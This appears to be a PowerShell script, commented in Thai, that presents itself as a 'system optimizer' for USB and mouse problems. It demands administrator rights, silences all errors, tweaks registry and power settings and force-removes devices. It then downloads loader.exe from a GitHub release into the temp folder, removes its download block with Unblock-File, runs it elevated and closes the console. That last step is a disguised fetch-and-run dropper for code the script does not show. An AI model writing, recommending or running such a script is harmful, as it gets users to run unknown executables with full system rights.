# กำหนดระบบเข้ารหัสของคอนโซลเป็น UTF-8 และโปรโตคอลความปลอดภัย TLS 1.2
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ปิดการแสดงแถบดาวน์โหลดระบบของ Invoke-WebRequest (เพิ่มความเร็วการโหลด 10 เท่า และป้องกันอาการค้าง)
$ProgressPreference = 'SilentlyContinue'

# ปิดการแจ้งเตือนข้อผิดพลาดทั่วไปที่ไม่จำเป็น
$ErrorActionPreference = "SilentlyContinue"

# ตรวจสอบสิทธิ์ผู้ดูแลระบบ (Administrator)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "กรุณาเปิด PowerShell ด้วยสิทธิ์ Administrator (Run as Administrator)"
    Break
}

# ฟังก์ชันแสดงผลหลอดโหลด (ใช้ภาษาอังกฤษล้วน 100% เพื่อไม่ให้เกิดกล่องสี่เหลี่ยมกลืนฟอนต์)
function Show-ProgressBar {
    param (
        [int]$Percent,
        [string]$Status
    )
    $width = 25
    $done = [Math]::Floor(($Percent / 100) * $width)
    $left = $width - $done
    $bar = ("█" * $done) + ("░" * $left)
    # แสดงสถานะหลอดโหลดบนบรรทัดเดียว
    Write-Host "`r  $Status [$bar] $Percent%  " -NoNewline -ForegroundColor Cyan
}

# เคลียร์หน้าต่างให้สะอาดที่สุด
Clear-Host
Write-Host ""
Write-Host "  ================================================" -ForegroundColor Cyan
Write-Host "            SYSTEM OPTIMIZER & LOADER" -ForegroundColor Yellow
Write-Host "  ================================================" -ForegroundColor Cyan
Write-Host ""

# ขั้นที่ 1: กำลังตรวจสอบระบบ (0% - 20%)
Show-ProgressBar 0 "Initializing system..."
Start-Sleep -Milliseconds 200

# 1. ปิดโหมดประหยัดพลังงาน USB
powercfg /SETACVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
powercfg /SETDCVALUEINDEX SCHEME_CURRENT 2a737441-1930-4402-8d77-b2bea2879909 48e6b7a6-50f5-4782-a5d4-53bb8f07e226 0 2>$null
powercfg /SETACTIVE SCHEME_CURRENT 2>$null

# 2. ปิดการประหยัดพลังงานใน Registry ของพอร์ต USB ทั้งหมด
$USBEnumPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
if (Test-Path $USBEnumPath) {
    Get-ChildItem -Path $USBEnumPath -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -eq "Device Parameters" } | ForEach-Object {
        Set-ItemProperty -Path $_.PSPath -Name "EnhancedPowerManagementEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $_.PSPath -Name "DeviceSelectiveSuspended" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    }
}
Show-ProgressBar 20 "Optimizing hardware settings..."
Start-Sleep -Milliseconds 200

# ขั้นที่ 2: คืนค่าและรีสตาร์ทบริการ (20% - 50%)
# 3. คืนค่า Registry ของเมาส์
$MouseRegPath = "HKCU:\Control Panel\Mouse"
Set-ItemProperty -Path $MouseRegPath -Name "MouseSpeed" -Value "1" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold1" -Value "6" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseThreshold2" -Value "10" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $MouseRegPath -Name "MouseSensitivity" -Value "10" -ErrorAction SilentlyContinue

# 4. ตั้งค่าบริการระบบ
$ServicesToFix = @("DeviceInstall", "hidserv")
foreach ($Service in $ServicesToFix) {
    Set-Service -Name $Service -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name $Service -ErrorAction SilentlyContinue
}
Show-ProgressBar 50 "Configuring system services..."
Start-Sleep -Milliseconds 200

# ขั้นที่ 3: รีเฟรชไดรเวอร์ (50% - 75%)
# 5. ล้างประวัติไดรเวอร์ที่มีปัญหา
$TargetDevices = Get-PnpDevice -ErrorAction SilentlyContinue | Where-Object {($_.Class -eq 'Mouse' -or $_.Class -eq 'USB') -and ($_.Status -ne 'OK' -or $_.Present -eq $false)}
foreach ($Device in $TargetDevices) {
    if ($Device.InstanceId) {
        pnputil /remove-device $Device.InstanceId /force | Out-Null
    }
}

# 6. สแกนฮาร์ดแวร์ใหม่
pnputil /scan-devices | Out-Null
Show-ProgressBar 75 "Connecting to server..."
Start-Sleep -Milliseconds 200

# ขั้นที่ 4: ดาวน์โหลด GUI (75% - 100%)
$Url = "https://github.com/zynx7crew/zynx7crew-x/releases/download/v1.0.0/loader.exe"
$DestPath = "$env:temp\loader.exe"

# ตรวจสอบและปิด Process เดิม
$Proc = Get-Process -Name "loader" -ErrorAction SilentlyContinue
if ($Proc) {
    Stop-Process -Name "loader" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
}

try {
    if (Test-Path $DestPath) {
        Remove-Item -Path $DestPath -Force -ErrorAction SilentlyContinue
    }
    
    # ดาวน์โหลดไฟล์
    Invoke-WebRequest -Uri $Url -OutFile $DestPath -ErrorAction Stop
    Unblock-File -Path $DestPath -ErrorAction SilentlyContinue
    
    Show-ProgressBar 100 "System ready! Launching GUI..."
    
    # เปิดโปรแกรม GUI พร้อมระบุโฟลเดอร์ทำงาน
    Start-Process -FilePath $DestPath -WorkingDirectory (Split-Path $DestPath) -Verb RunAs
    
    # ปิดหน้าต่างคอนโซลลงทันทีแบบไม่ดีเลย์
    exit
}
catch {
    Write-Host ""
    Write-Host "  [x] Error: Check your internet connection." -ForegroundColor Red
}
